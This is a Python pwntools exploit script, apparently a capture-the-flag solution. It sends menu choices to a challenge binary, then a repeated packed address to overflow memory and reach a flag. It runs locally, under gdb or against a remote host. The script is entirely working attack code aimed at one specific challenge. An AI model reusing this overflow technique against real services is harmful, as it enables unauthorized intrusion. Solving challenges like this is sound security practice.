from pwn import *
import sys
import os
import argparse
from time import sleep

# don't ask me why this works

def do_stuff(r):
	flag_addr_offset = p64(0x6020e0 + 256 + 128)

	r.recvuntil("9)")
	r.recvline()
	r.recvline()
	r.sendline("1")

	r.recvline()
	r.sendline("A")
	
	r.recvline()
	r.sendline("B")

	r.recvline()
	r.sendline(flag_addr_offset * 63)
	r.interactive()

if __name__ == "__main__":
	if len(sys.argv) == 2 or (len(sys.argv) == 3 and sys.argv[2] == "--gdb"):
		# env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so")}
		# Parse
		if len(sys.argv) == 3 and sys.argv[2] == "--gdb":
			r = process(sys.argv[1])
			gdb.attach(r, "b *0x400e07")    # commands can be specified as the second parameter
			# gdb.attach(r, "b main")    # commands can be specified as the second parameter
			sleep(1)
			do_stuff(r)
			r.close()
		else:
			r = process(sys.argv[1])
			do_stuff(r)
			r.close()
	elif len(sys.argv) == 3:
		# Parse
		host = sys.argv[1]
		try:
			port = int(sys.argv[2])
		except:
			log.error("Port must be a number")
		# Setup connection and call helper
		r = remote(host, port)
		do_stuff(r)
		r.close()
